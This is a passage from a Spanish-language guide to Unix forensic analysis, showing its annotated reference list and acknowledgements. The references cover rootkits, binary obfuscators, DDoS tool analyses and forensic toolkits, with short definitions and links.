+</p></div></div><div class="sect1"><div class="titlepage"><div><h2 class="title" style="clear: both"><a name="id2760015"></a>13. Referencias </h2></div></div><div class="orderedlist"><ol type="1"><li><p>Análisis Sistemas Forenses - Este documento se basa en el trabajo de    David Dittrich de la Universidad de Washington.</p></li><li><p>RootKit - Un &quot;rootkit&quot; es un conjunto de herramientas que:    garantizan el acceso posterior al sistema, facilitan el potencial    acceso a otros servidores, facilitan el borrado de huellas del    atacador, intentan esconder al atacante de los usuarios legítimos    del sistema. </p></li><li><p>Ataque de Limpieza - Es un tipo de ataque informático local o remoto    cuyo objetivo es la eliminación de las pruebas de compromiso    anterior. El resultado de este tipo de ataques puede ser un destrozo    de información en un equipo anteriormente comprometido o de un    forense informático. El atacante intenta llevar acabo un borrado de    información masivo, utilizando las técnicas de eliminación de    información por sobre escritura si se trata de un ataque remoto y/o    deformación magnética y des-magnetización de medios si se trata de    un ataque local. </p></li><li><p>UPX - Ultimate Packer for eXecutables    (<a href="http://upx.sourceforge.net/" target="_top">http://upx.sourceforge.net/</a>). Una herramienta para comprimir el    ejecutable a fin de reducir su tamaño. </p></li><li><p>BurnEye - Una herramienta desarrollada por el grupo TESO    (<a href="http://www.team-teso.net/" target="_top">http://www.team-teso.net/</a>) que utiliza las técnicas de inyección de    código en ejecutables de tipo ELF. La aplicación ofrece 3 niveles de    protección ofuscación de código, protección con contraseña, y    &quot;fingerprinting&quot;. </p></li><li><p>BurnEye Nivel 1 - Para más información sobre el método de obtener el    binario original de uno ofuscado vean    <a href="http://www.activalink.com/reviews/elf.php" target="_top">http://www.activalink.com/reviews/elf.php</a> y    <a href="http://www.phrack.com/show.php?p=58" target="_top">http://www.phrack.com/show.php?p=58</a>. </p></li><li><p>Burneye Nivel 2 - Para más información sobre métodos de ingeniería    inversa de binarios protegidos con el nivel 2 de protección de    BurnEye ver un caso práctico    <a href="http://www.incidents.org/papers/ssh_exploit.pdf" target="_top">http://www.incidents.org/papers/ssh_exploit.pdf</a>.</p></li><li><p>Fenris - Un debugger popular y potente ya que interactúa con el    sistema operativo y libc a un bajo nivel, sin utilizar las llamadas    ptrace(); ver <a href="http://razor.bindview.com/tools/fenris/" target="_top">http://razor.bindview.com/tools/fenris/</a>. </p></li><li><p>Elfe - Lightweight Elf Encryptor (<a href="http://stealth.7350.org/" target="_top">http://stealth.7350.org/</a>) Una    herramienta desarrollada por Stealth del grupo TESO que utiliza    técnicas de inyección de un motor de cifrado dentro de un    ejecutable. La aplicación protege la ejecución de un binario por una    contraseña. Éste método de protección de ejecutables es menos fiable    que 2º y 3er nivel de BurnEye. </p></li><li><p>Phrack - Gnugq ha escrito un buen white paper sobre el tema de    protección &quot;run-time&quot; de binarios que incluye más información sobre    el tema www.phrack.com/show.php?p=58&amp;a=5. </p></li><li><p>RootKit - Una colección de utilidades para permitir al intruso    ocultar su actividad dentro de un sistema, facilitar el acceso en un    futuro, y recoger información útil del sistema. Ver la versión    actualizada de FAQ en Inglés sobre RootKits creada por Dave Dittrich    de la universidad de Washington    D.C. <a href="http://staff.washington.edu/dittrich/misc/faqs/rootkits.faq" target="_top">http://staff.washington.edu/dittrich/misc/faqs/rootkits.faq</a>. </p></li><li><p>Biatchux - Es una distribución de linux portable sobre el CD-ROM que    proporciona herramientas y un entorno seguro para realizar análisis    forense, recuperación de datos, detección de virus y evaluación de    vulnerabilidades (<a href="http://biatchux.dmzs.com/" target="_top">http://biatchux.dmzs.com/</a>). </p></li><li><p>Thomas Rude - El autor de un artículo sobre la manera de realización    de copias físicas de particiones y discos para el análisis forense    (<a href="http://www.crazytrain.com/dd.html" target="_top">http://www.crazytrain.com/dd.html</a>). </p></li><li><p>The Coroner's Toolkit- Una colección de herramientas de un    investigador forense. Utilidades escritas por Dan y Wietse (trabaja    para IBM, y el autor de postfix). Las utilidades incluidas en el kit    proporcionan una ayuda substancial para el investigador    (<a href="http://www.fish.com/tct/" target="_top">http://www.fish.com/tct/</a>). </p></li><li><p>Trinoo - Análisis de un ataque con una herramienta de DDoS (The DoS    Project's &quot;trinoo&quot; distributed denial of service attack tool -    <a href="http://staff.washington.edu/dittrich/misc/trinoo.analysis" target="_top">http://staff.washington.edu/dittrich/misc/trinoo.analysis</a>).</p></li><li><p>Mstream - Análisis de un ataque con una herramienta de DDoS (The    &quot;mstream&quot; distributed denial of service attack tool -    <a href="http://staff.washington.edu/dittrich/misc/mstream.analysis.txt" target="_top">http://staff.washington.edu/dittrich/misc/mstream.analysis.txt</a>).</p></li><li><p>Van Hauser - Lea el documento de Van Hauser sobre &quot;Anonymizing Unix    Systems&quot; para la información de como pueden los hackers con    experiencia complicar la situación    (<a href="http://www.thehackerschoice.com/papers/fw-backd.htm" target="_top">http://www.thehackerschoice.com/papers/fw-backd.htm</a>).</p></li><li><p>Techniques of Crime Scene Investigation, por Barry A. J. Fisher, CRC    Press, ISBN 0-8493-8119-3</p></li><li><p>Mejora de Rendimiento de Sistemas de Copia de Seguridad - Whitepaper    de Hewlett-Packard (<a href="http://www.hp.com/tape/papers/perftune.html" target="_top">http://www.hp.com/tape/papers/perftune.html</a>).</p></li><li><p>Clase de Farmer &amp; Wietse Venema sobre análisis forense de sistemas    informáticos - forensics.tar.gz contiene 6 diapositivas PostScript    (<a href="http://www.fish.com/security/forensics.html" target="_top">http://www.fish.com/security/forensics.html</a>).</p></li><li><p>Forensic Computer Analysis: Introducción a la Reconstrucción de    eventos pasados, por Dan Farmer y Wietse Venema, Dr. Dobb's Journal,    Septiembre 2000    (<a href="http://www.ddj.com/articles/2000/0009/0009f/0009f.htm" target="_top">http://www.ddj.com/articles/2000/0009/0009f/0009f.htm</a>).</p></li><li><p>¿Qué son los MACtimes?: Herramientas poderosas para bases de datos,    por Dan Farmer, Dr. Dobb's Journal, Octubre 2000    (<a href="http://www.ddj.com/articles/2000/0010/0010f/0010f.htm" target="_top">http://www.ddj.com/articles/2000/0010/0010f/0010f.htm</a>).</p></li><li><p>Strangers In the Night: Encontrar el objetivo del binario    desconocido, por Wietse Venema, Dr. Dobb's Journal, Noviembre 2000    (<a href="http://www.ddj.com/articles/2000/0011/0011g/0011g.htm" target="_top">http://www.ddj.com/articles/2000/0011/0011g/0011g.htm</a>).</p></li><li><p>&quot;Root Kits&quot; y ocultación de directorios después del break-in    (<a href="http://staff.washington.edu/dittrich/misc/faqs/rootkits.faq" target="_top">http://staff.washington.edu/dittrich/misc/faqs/rootkits.faq</a>).</p></li><li><p>Info.sec.radio segmentos de análisis forense (@15:45.0), Julio 10,    2000 (<a href="http://www.securityfocus.com/media/41" target="_top">http://www.securityfocus.com/media/41</a>).</p></li><li><p>SecurityFocus - Entrevista con Jennifer Grannic    (<a href="http://www.securityfocus.com/media/41" target="_top">http://www.securityfocus.com/media/41</a>). </p></li><li><p>SecurityFocus - entrevista con Chad Davis    (<a href="http://www.securityfocus.com/media/35" target="_top">http://www.securityfocus.com/media/35</a>).</p></li><li><p>Anonymizing Unix Systems, por van Hauser, THC    (<a href="http://thc.pimmel.com/files/thc/anonymous-unix.html" target="_top">http://thc.pimmel.com/files/thc/anonymous-unix.html</a>).</p></li><li><p>Federal Guidelines for Searching and Seizing Computers, Departamento    de Justicia de EE. UU.    (<a href="http://www.usdoj.gov/criminal/cybercrime/searching.html" target="_top">http://www.usdoj.gov/criminal/cybercrime/searching.html</a>).</p></li><li><p>DD and Computer Forensics: Ejemplos de utilización de DD dentro de    Unix para crear backups físicos, por Thomas Rude, CISSP, Agosto 2000    (<a href="http://www.crazytrain.com/dd.html" target="_top">http://www.crazytrain.com/dd.html</a>).</p></li><li><p>El kernel de GNU/Linux ofrece soporte para sistemas de ficheros    loopback, siendo una técnica bastante común. Ver para más    información Laptop-HOWTO    (<a href="http://www.tldp.org/HOWTO/Laptop-HOWTO.html" target="_top">http://www.tldp.org/HOWTO/Laptop-HOWTO.html</a>), Bootdisk-HOWTO    (<a href="http://www.tldp.org/HOWTO/Bootdisk-HOWTO/" target="_top">http://www.tldp.org/HOWTO/Bootdisk-HOWTO/</a>),    Loopback-Encrypted-Filesystem-HOWTO    (<a href="http://www.tldp.org/HOWTO/Loopback-Encrypted-Filesystem-HOWTO.html" target="_top">http://www.tldp.org/HOWTO/Loopback-Encrypted-Filesystem-HOWTO.html</a>).</p></li><li><p>La última versión de éste documento está disponible en     <a href="http://www.activalink.com/forensics3.php" target="_top">http://www.activalink.com/forensics3.php</a>.</p></li></ol></div></div><div class="sect1"><div class="titlepage"><div><h2 class="title" style="clear: both"><a name="id2760628"></a>14. Agradecimientos </h2></div></div><p>
+Se agradece la colaboración directa así como indirecta de:
+</p><div class="itemizedlist"><ul type="disc"><li><p>Dan Farmer por su respuesta a las preguntas pesadas.</p></li><li><p>Wietse Venema por su contribución a la tecnología de análisis    forense de sistemas Unix. </p></li><li><p>David Dittrich, el autor original del estudio.</p></li><li><p>Scut del Equipo TESO</p></li><li><p>The Gnugq, uno de los editores de la revista Phrack.</p></li></ul></div></div></div></body></html>
